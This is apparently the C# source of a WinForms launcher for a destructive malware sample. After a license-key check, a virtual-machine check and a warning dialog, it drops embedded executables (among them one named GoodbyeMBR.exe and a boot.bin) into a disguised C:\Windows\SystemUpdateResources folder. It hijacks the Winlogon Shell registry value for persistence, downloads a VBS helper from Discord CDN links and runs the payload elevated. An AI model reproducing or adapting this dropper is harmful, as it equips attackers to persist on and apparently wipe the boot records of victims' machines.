using System;
using System.Windows.Forms;
using Auth.GG_Winform_Example;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using auth.Properties;
using System.Reflection;
using System.Net;
using System.Linq;
using System.Management;

namespace auth
{
    public partial class OldForm1 : Form
    {
        public OldForm1()
        {
            InitializeComponent();
            this.MinimizeBox = false;
            this.MaximizeBox = false;
            String thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
            {
                Environment.Exit(0);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private bool IsInstalledDotNetCompatible()
        {
            using (RegistryKey ndpKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full"))
            {
                int releaseKey = Convert.ToInt32(ndpKey.GetValue("Release"));
                if (releaseKey >= 461808)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private bool redistCheck()
        {
            if (File.Exists("C:\\Windows\\System32\\vcruntime140.dll"))
            {
                return true;
            } else
            {
                return false;
            }
        }

        private bool isVM()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (IsInstalledDotNetCompatible() == false)
            {
                MessageBox.Show("This app requires .NET Framework 4.7.2 or later to run properly. You can download .NET from Microsoft's website", ".NET Framework Compatibility Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            } else
            if (redistCheck() == false)
            {
                MessageBox.Show("C++ Redist not found on your system. Download the Microsoft C++ Redists from Microsoft's website", "Redist Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            } else
            if(isVM() == false)
            {
                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            } else if (API.AIO(textBox1.Text))
            {
                var s = MessageBox.Show("LAST WARNING: Do you want to execute this malware? This sample is malicious and is NOT A JOKE! The creator is NOT responsible for any damage done. You're responsible for your own actions. If in doubt, click \"No\" and nothing will happen.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                if (s == DialogResult.Yes)
                {
                    this.Hide();
                    Directory.CreateDirectory(@"C:\Windows\SystemUpdateResources");
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\UpdateScreen.exe", Resources.UpdateScreen);
                    if (!Directory.Exists(@"C:\Windows\SystemUpdateResources")) { Directory.CreateDirectory(@"C:\Windows\SystemUpdateResources"); } else { }
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\phase3.exe", auth.Properties.Resources.phase3);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\PanOSMain.exe", auth.Properties.Resources.PanOSMain);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\BlacklistedApp.exe", auth.Properties.Resources.BlacklistedApp);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\GoodbyeMBR.exe", auth.Properties.Resources.GoodbyeMBR);
                    File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\boot.bin", auth.Properties.Resources.boot);
                    //File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\backupcmd.exe", auth.Properties.Resources.cmd);
                    //File.WriteAllBytes(@"C:\Windows\SystemUpdateResources\backuptaskkill.exe", auth.Properties.Resources.backuptaskkill);
                    RegistryKey setshellkey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
                    setshellkey.SetValue("Shell", "explorer.exe, \"C:\\Windows\\SystemUpdateResources\\UpdateScreen.exe\"");
                    setshellkey.Dispose();
                    auth.Properties.Resources.BelfiOre_Windows_10_Wallpaper.Save(@"C:\Windows\SystemUpdateResources\BelfiOre Wallpaper.jpg");
                    WebClient audio = new WebClient();
                    string url = "https://cdn.discordapp.com/attachments/705283503163572256/839094340651188234/Windows_8_Error_Dubstep_Remix_Final.wav";
                    string path = @"C:\Windows\SystemUpdateResources\audio.wav";
                    audio.DownloadFile(url, path);
                    audio.Dispose();
                    WebClient belfioreico = new WebClient();
                    string belfioreurl = "https://cdn.discordapp.com/attachments/705283503163572256/839087252948779018/Belfiore.ico";
                    string belfiorepath = @"C:\Windows\SystemUpdateResources\Belfiore.ico";
                    belfioreico.DownloadFile(belfioreurl, belfiorepath);
                    belfioreico.Dispose();
                    WebClient helpervbs = new WebClient();
                    string helpervbsurl = "https://cdn.discordapp.com/attachments/705283503163572256/844403432572059668/PanOSMainLaunchHelper.vbs";
                    string helpervbspath = @"C:\Windows\SystemUpdateResources\PanOSMainLaunchHelper.vbs";
                    helpervbs.DownloadFile(helpervbsurl, helpervbspath);
                    helpervbs.Dispose();
                    Process startupdatescreen = new Process();
                    startupdatescreen.StartInfo.FileName = @"C:\Windows\SystemUpdateResources\UpdateScreen.exe";
                    startupdatescreen.StartInfo.Verb = "runas";
                    startupdatescreen.Start();
                    Environment.Exit(0);
                }
                else if (s == DialogResult.No)
                {
                    Environment.Exit(0);
                }

            }
            else
            {
                MessageBox.Show("Invalid Key!", "Error");
                textBox1.Clear();
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Auth_Click(object sender, LinkLabelLinkClickedEventArgs e)
        {

        }

        private void AuthRequestKey_Click(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("mailto:orangemanagementcorpn@gmail.com");
        }
    }
}
